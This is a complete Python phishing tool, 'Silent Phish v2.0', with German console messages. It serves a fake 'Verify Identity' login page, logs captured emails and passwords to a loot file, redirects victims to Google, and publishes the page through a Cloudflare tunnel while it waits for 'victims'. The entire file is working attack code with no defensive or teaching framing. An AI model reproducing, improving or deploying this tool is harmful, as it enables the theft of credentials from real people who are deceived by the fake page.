import http.server
import socketserver
import urllib.parse
import time
import os
import sys
import subprocess
import re
from colorama import Fore, Style, init

init(autoreset=True)

# --- FAKE WEBSITE ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
<title>Security Verification</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background-color: #121212; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
.login-container { background: #1e1e1e; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 350px; text-align: center; border: 1px solid #333; }
input { width: 100%; padding: 12px; margin: 10px 0; background: #2c2c2c; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
button:hover { background-color: #0056b3; }
h2 { margin-bottom: 20px; }
.note { font-size: 12px; color: #888; margin-top: 15px; }
</style>
</head>
<body>
<div class="login-container">
    <h2>Verify Identity</h2>
    <p style="color:#bbb; font-size:14px;">Unusual activity detected. Please sign in.</p>
    <form method="POST">
        <input type="text" name="email" placeholder="Username / Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify Securely</button>
    </form>
    <div class="note">Encrypted Connection End-to-End</div>
</div>
</body>
</html>
"""

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args): return

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_TEMPLATE.encode("utf-8"))
        print(f"{Fore.YELLOW}[*] Hit! Jemand hat die Seite geöffnet (IP: {self.client_address[0]})")

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode("utf-8")
        parsed = urllib.parse.parse_qs(data)
        email = parsed.get('email', [''])[0]
        password = parsed.get('password', [''])[0]
        
        print(f"\n{Fore.GREEN}╔════════════ CAPTURED ════════════╗")
        print(f"{Fore.WHITE}   User: {Fore.CYAN}{email}")
        print(f"{Fore.WHITE}   Pass: {Fore.RED}{password}")
        print(f"{Fore.GREEN}╚══════════════════════════════════╝\n")
        
        with open("loot.txt", "a") as f:
            f.write(f"User: {email} | Pass: {password}\n")

        self.send_response(302)
        self.send_header('Location', 'https://google.com')
        self.end_headers()

class SilentPhish:
    def __init__(self):
        self.port = 8080
        self.tunnel_process = None

    def start_tunnel(self):
        """Startet Cloudflared und extrahiert URL zuverlässig"""
        print(f"{Fore.CYAN}[INFO] Starte Cloudflare Tunnel...")
        
        try:
            # Cloudflared mit JSON-Output für besseres Parsing
            self.tunnel_process = subprocess.Popen(
                ["cloudflared", "tunnel", "--url", f"http://localhost:{self.port}", "--metrics", "localhost:8081"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Warte auf URL (max 10 Sekunden)
            print(f"{Fore.YELLOW}[*] Warte auf Tunnel-URL...")
            for i in range(20):
                time.sleep(0.5)
                # Prüfe stderr auf URL
                try:
                    stderr_content = self.tunnel_process.stderr.read(1000)
                    if stderr_content:
                        # Suche nach typischer Cloudflare URL
                        urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', stderr_content)
                        if urls:
                            url = urls[0]
                            print(f"{Fore.GREEN}[+] Öffentliche URL: {Fore.WHITE}{url}")
                            return url
                except:
                    pass
            
            print(f"{Fore.YELLOW}[!] URL nicht automatisch erkannt")
            print(f"{Fore.WHITE}Manuelle URL: https://dashboard.cloudflare.com/")
            return None
            
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR] 'cloudflared' nicht installiert!")
            print(f"{Fore.YELLOW}Befehl: sudo apt install cloudflared")
            return None

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.RED}SILENT PHISH v2.0 (Cloudflare Edition)")
        
        use_cf = input(f"{Fore.YELLOW}[?] Cloudflare Tunnel starten? (y/n): ").strip().lower()
        if use_cf == "":
            print(f"{Fore.YELLOW}[INFO] Abbruch.")
            return
        
        if use_cf == 'y':
            url = self.start_tunnel()
            if url:
                print(f"\n{Fore.MAGENTA}[+] Öffentlicher Link: {url}")
            print(f"\n{Fore.MAGENTA}*** SERVER LÄUFT. WARTE AUF VICTIMS ***")
        
        print(f"{Fore.WHITE}Lokal: http://localhost:{self.port}")
        start_server = input(f"{Fore.YELLOW}[?] Server starten? (y/n): ").strip().lower()
        if start_server != "y":
            print(f"{Fore.YELLOW}[INFO] Server nicht gestartet.")
            if self.tunnel_process:
                self.tunnel_process.terminate()
            return
        
        try:
            with socketserver.TCPServer(("", self.port), PhishHandler) as httpd:
                print(f"{Fore.GREEN}[+] Server läuft auf Port {self.port}")
                httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Beendet.")
            if self.tunnel_process:
                self.tunnel_process.terminate()

if __name__ == "__main__":
    SilentPhish().run()
